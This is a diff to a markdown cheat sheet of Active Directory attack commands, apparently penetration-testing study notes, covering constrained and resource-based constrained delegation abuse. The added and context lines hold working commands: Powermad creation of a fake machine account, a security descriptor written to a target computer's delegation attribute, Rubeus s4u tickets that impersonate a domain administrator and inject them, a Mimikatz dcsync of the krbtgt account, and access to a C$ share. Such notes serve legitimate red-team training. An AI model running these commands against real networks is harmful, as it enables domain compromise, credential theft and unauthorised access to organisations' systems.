@@ -510,16 +510,17 @@ Get-Domaincomputer -TrustedToAuth | select samaccountname, msds-allowedtodelegat
 .\Rubeus.exe hash /password:<PASSWORD> /user:<USER> /domain:<DOMAIN>
 ```
 
+
+#### Check for user to impersonate
+```
+Get-DomainUser | ? {!($_.memberof -Match "Protected Users")} | select samaccountname, memberof
+```
+
 #### Rubeus request and inject TGT + TGS
 - Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
 - Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right
 ```
 .\Rubeus.exe s4u /user:<USERNAME> /rc4:<NTLM HASH> /impersonateuser:administrator /domain:<DOMAIN> /msdsspn:<SERVICE ALLOWED TO DELEGATE>/<SERVER FQDN> /altservice:<SECOND SERVICE> /<SERVER FQDN> /ptt
-```
-
-#### Check for user to impersonate
-```
-Get-DomainUser | ? {!($_.memberof -Match "Protected Users")} | select samaccountname, memberof
 ```
 
 #### Requesting TGT with kekeo
@@ -571,18 +572,8 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'
   − Two, Write permissions over the target service or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity.  
 
 ### Computer object takeover
-- Requires the following:
-  - An owned system
-  - Write privileges on another computerobject
-  - Being able to join computers to the domain
 - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution
 
-#### Check who can add computers to the domain
-```
-(Get-DomainPolicy -Policy DC).PrivilegeRights.SeMachineAccountPrivilege.Trim("*") | Get-DomainObject | Select-Object name
-
-Get-DomainObject | Where-Object ms-ds-machineaccountquota
-```
 
 #### Check if domain controller is atleast Windows Server 2012
 ```
@@ -595,6 +586,16 @@ Get-DomainComputer <COMPUTERNAME>
 Get-DomainComputer <COMPUTERNAME> | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
 ```
 
+#### Get access to a user or computer with SPN set
+- If not already have a user or computer with a SPN, Create a computer object!
+
+#### Check who can add computers to the domain
+```
+(Get-DomainPolicy -Policy DC).PrivilegeRights.SeMachineAccountPrivilege.Trim("*") | Get-DomainObject | Select-Object name
+
+Get-DomainObject | Where-Object ms-ds-machineaccountquota
+```
+
 #### Create a new computer object
 - https://github.com/Kevin-Robertson/Powermad
 ```
@@ -602,16 +603,16 @@ import-module powermad
 New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
 ```
 
-#### Check if object is created
-- Cop the sid
+#### Get the object SID
 ```
 Get-DomainComputer fake01
+Get-DomainUser <USER>
 ```
 
 #### Creata a new raw security descriptor
 - Using the sid from previous command
 ``` 
-$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<SID NEW COMPUTER>)"
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<SID>)"
 $SDBytes = New-Object byte[] ($SD.BinaryLength)
 $SD.GetBinaryForm($SDBytes, 0)
 ```
@@ -628,25 +629,38 @@ Get-DomainComputer <TARGET COMPUTER> -Properties 'msds-allowedtoactonbehalfofoth
 
 #### Check raw security descriptor refering to the correct machine
 ```
+$RawBytes = Get-DomainComputer <TARGET COMPUTER> -Properties 'msds-allowedtoactonbehalfofotheridentity' | Select-Object -ExpandProperty msds-allowedtoactonbehalfofotheridentity
 (New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl
 ```
 
 #### Generate RC4 hash for the made computer object
+- Only if you made a computer or you dont know the hash of the user
 ```
-Rubeus.exe hash /password:123456 /user:fake01 /domain:<DOMAIN>
+.\Rubeus.exe hash /password:123456 /user:fake01 /domain:<DOMAIN>
+```
+
+#### Check for user to impersonate
+```
+Get-DomainUser | ? {!($_.memberof -Match "Protected Users")} | select samaccountname, memberof
 ```
 
 #### Impersonate another user (For example DA)
+- Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right
 ```
-rubeus.exe s4u /user:fake01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:<TARGET USER DA> /msdsspn:cifs/<TARGET COMPUTER> /ptt
+.\Rubeus.exe s4u /user:<USER OR COMPUTER$> /rc4:<HASH> /impersonateuser:<TARGET USER DA> /msdsspn:cifs/<TARGET COMPUTER> /ptt
+
+.\Rubeus.exe s4u /user:<USER OR COMPUTER$> /rc4:<HASH> /impersonateuser:<TARGET USER DA> /msdsspn:host/<TARGET COMPUTER> /altservice:ldap,rpc,http,cifs /ptt
 ```
 
-#### Access the C Disk
+#### Access the C Disk if user is local admin to the target machine (When impersonating DA)
 ```
 dir \\<COMPUTER>\C$
 ```
 
 If the dir doesn't work read the blogpost! That might tell you why! (Didn't test the attack myself yet)
+
+#### It is possible that you impersonated another user which leads to more ACL abuses!
+
 
 ### Image Change Privilege Escalation
 - Privescs on local machine
